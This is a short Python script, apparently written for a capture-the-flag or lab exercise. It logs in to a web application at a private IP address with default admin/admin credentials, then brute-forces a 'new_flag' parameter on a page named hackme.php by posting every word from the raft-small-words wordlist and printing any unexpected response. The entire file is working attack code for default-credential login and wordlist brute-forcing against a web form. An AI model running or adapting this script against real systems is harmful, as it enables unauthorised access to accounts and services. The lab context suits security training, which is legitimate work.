import requests 
lines = []

with open("raft-small-words.txt","r") as raft:
    lines = raft.readlines()

s = requests.Session()

credentials = {
'login_field': 'admin',
'cred_field': 'admin'
}

response = s.post('http://172.25.0.31/check.php', data=credentials)
#print(response.text)

#response1 = s.post('http://192.168.228.192/hackme.php')
#print(response1.text)

for i in lines:
    mydata = {'new_flag':i.replace("\n","")}
    # Set out post parameter of flag_value to the current work in raft-small-words.txt

    response2 = s.post('http://172.25.0.31/hackme.php', data=mydata)
    #Post the information to the hackme,php webpage using the current session (s)

    currentPageText = response2.text
    # Save the current page text to a variable

    if "You are currently logged in" not in currentPageText:
        print(response2.text)
    #Check to see if teh text aboce (brute-force) is not there. If it's not, show us what actually was returned!